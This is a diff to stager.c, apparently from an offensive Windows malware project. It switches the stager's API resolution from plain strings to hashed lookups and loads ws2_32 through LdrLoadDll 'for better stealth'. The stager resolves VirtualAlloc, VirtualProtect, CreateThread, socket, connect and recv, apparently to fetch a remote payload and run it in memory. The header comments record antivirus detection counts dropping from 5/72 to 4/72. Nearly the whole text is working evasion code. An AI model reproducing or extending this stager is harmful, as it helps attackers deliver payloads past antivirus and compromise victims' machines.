@@ -8,8 +8,8 @@
  *
  * x86_64-w64-mingw32-gcc -nostdlib -nostartfiles -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe
  * 
- * // Working flags below, 5/72
- * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe -lws2_32
+ * // Working flags below, 4/72
+ * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe 
  * */
 
 // TODO: eventually convert to c code then asm then shell code?
@@ -22,20 +22,15 @@
 #include "../utils/utils.h"
 #include "../utils/kernel32_util.h"
 #include "../utils/ntdll_util.h"
-
-//#include <stdio.h>
-//#include <stdlib.h>
-
-// TODO: GetProcAddress is not working... fix it
+#include "../utils/encryption_util.h"
 
 
-#pragma comment(lib, "ws2_32.lib")
+
 
 //bool Stager::run(const std::string& host, const std::string& port)
 int run(const char* host, const char* port)
 {
     // 1. manually resolve apis
-
     /*
     TODO: 
     would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have 
@@ -48,12 +43,22 @@ int run(const char* host, const char* port)
     
     */
 
+    HMODULE kernel32_module = GetModuleHandleManualHash(KERNEL32_DLL_HASH);
+
+
 	// TODO: hash these string literals 
-    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManual("kernel32.dll", "VirtualAlloc");
-    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManual("kernel32.dll", "VirtualProtect");
-    FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");
-	FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManual("kernel32.dll", "WaitForSingleObject");
-    FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManual("ntdll.dll", "LdrLoadDll");
+    //FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManual("kernel32.dll", "VirtualAlloc");
+    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManualHash(kernel32_module, VIRTUALALLOC_HASH);
+    //FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManual("kernel32.dll", "VirtualProtect");
+    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManualHash(kernel32_module, VIRTUALPROTECT_HASH);
+    //FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");
+    FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManualHash(kernel32_module, CREATETHREAD_HASH);
+	//FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManual("kernel32.dll", "WaitForSingleObject");
+    FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManualHash(kernel32_module, WAITFORSINGLEOBJECT_HASH);
+
+    HMODULE ntdll_module = GetModuleHandleManualHash(NTDLL_DLL_HASH);
+    //FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManual("ntdll.dll", "LdrLoadDll");
+    FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManualHash(ntdll_module, LDRLOADDLL_HASH);
 
 	// RtlInitUnicodeString(&usDllName, L"ws2_32.dll");
     // NOTE: use stack allocation instead of RtlInitUnicodeString for better stealth
@@ -61,27 +66,36 @@ int run(const char* host, const char* port)
     usDllName.Length = 20;
     usDllName.MaximumLength = 22;
     usDllName.Buffer = L"ws2_32.dll";
-    PVOID dllBase; // ws2_32.dll pModule
-    NTSTATUS status = pLdrLoadDll(NULL, NULL, &usDllName, &dllBase);
+    PVOID ws2_32_module; // ws2_32.dll pModule
+    NTSTATUS status = pLdrLoadDll(NULL, NULL, &usDllName, &ws2_32_module);
     // TODO: for now we just assume it's always successful
     //if (!NT_SUCCESS(status))
     if (status != 0)
 	{
         printf("status = %d\n", status);
-		printf("pLdrLoadDll was unable to obtain valid dllBase\n");
+		//printf("pLdrLoadDll was unable to obtain valid dllBase\n");
 	}
 
-    printf("start\n");
-    FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManualM(dllBase, "WSAStartup");
-    printf("start2\n");
-    FuncWSACleanup pWSACleanup = (FuncWSACleanup)GetProcAddressManualM(dllBase, "WSACleanup");
-    FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)GetProcAddressManualM(dllBase, "getaddrinfo");
-    FuncFreeAddrInfo pFreeAddrInfo = (FuncFreeAddrInfo)GetProcAddressManualM(dllBase, "freeaddrinfo");
-    FuncSocket pSocket = (FuncSocket)GetProcAddressManualM(dllBase, "socket");
-    FuncCloseSocket pCloseSocket = (FuncCloseSocket)GetProcAddressManualM(dllBase, "closesocket");
-    FuncConnect pConnect = (FuncConnect)GetProcAddressManualM(dllBase, "connect");
+    //HMODULE ws2_32_module = GetModuleHandleManualHash(WS2_32_DLL_HASH); // TODO: this would need to be changed to loadlib or something
+
+    //FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManualM(ws2_32_module, "WSAStartup");
+    FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManualHash(ws2_32_module, WSASTARTUP_HASH);
+    //FuncWSACleanup pWSACleanup = (FuncWSACleanup)GetProcAddressManualM(dllBase, "WSACleanup");
+    FuncWSACleanup pWSACleanup = (FuncWSACleanup)GetProcAddressManualHash(ws2_32_module, WSACLEANUP_HASH);
+    //FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)GetProcAddressManualM(dllBase, "getaddrinfo");
+    FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)GetProcAddressManualHash(ws2_32_module, GETADDRINFO_HASH);
+    //FuncFreeAddrInfo pFreeAddrInfo = (FuncFreeAddrInfo)GetProcAddressManualM(dllBase, "freeaddrinfo");
+    FuncFreeAddrInfo pFreeAddrInfo = (FuncFreeAddrInfo)GetProcAddressManualHash(ws2_32_module, FREEADDRINFO_HASH);
+    //FuncSocket pSocket = (FuncSocket)GetProcAddressManualM(dllBase, "socket");
+    FuncSocket pSocket = (FuncSocket)GetProcAddressManualHash(ws2_32_module, SOCKET_HASH);
+    //FuncCloseSocket pCloseSocket = (FuncCloseSocket)GetProcAddressManualM(dllBase, "closesocket");
+    FuncCloseSocket pCloseSocket = (FuncCloseSocket)GetProcAddressManualHash(ws2_32_module, CLOSESOCKET_HASH);
+    //FuncConnect pConnect = (FuncConnect)GetProcAddressManualM(dllBase, "connect");
+    FuncConnect pConnect = (FuncConnect)GetProcAddressManualHash(ws2_32_module, CONNECT_HASH);
     //FuncSend pSend = (FuncSend)GetProcAddressManual("ws2_32.dll", "send");
-    FuncRecv pRecv = (FuncRecv)GetProcAddressManualM(dllBase, "recv");
+    //FuncSend pSend = (FuncSend)GetProcAddressManual("ws2_32.dll", "send");
+    //FuncRecv pRecv = (FuncRecv)GetProcAddressManualM(dllBase, "recv");
+    FuncRecv pRecv = (FuncRecv)GetProcAddressManualHash(ws2_32_module, RECV_HASH);
 
     //std::cout << "1 - Starting" << std::endl;
 	// printf("1 - Starting\n");
